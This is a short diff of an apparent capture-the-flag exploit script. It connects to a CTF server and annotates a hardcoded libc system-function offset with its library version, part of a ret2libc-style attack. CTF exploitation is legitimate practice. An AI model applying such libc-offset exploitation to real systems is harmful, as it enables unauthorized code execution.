@@ -37,7 +37,7 @@ if sys.argv[1]=='local':
     system_offset = libc.symbols['system'] - libc.symbols['atoi']
 elif sys.argv[1]=='remote':
     p = remote('ctf.h-c0n.com', 60001)
-    system_offset = 0xe510
+    system_offset = 0xe510 # libc6_2.23-0ubuntu11_amd64
 else:
     exit()
 
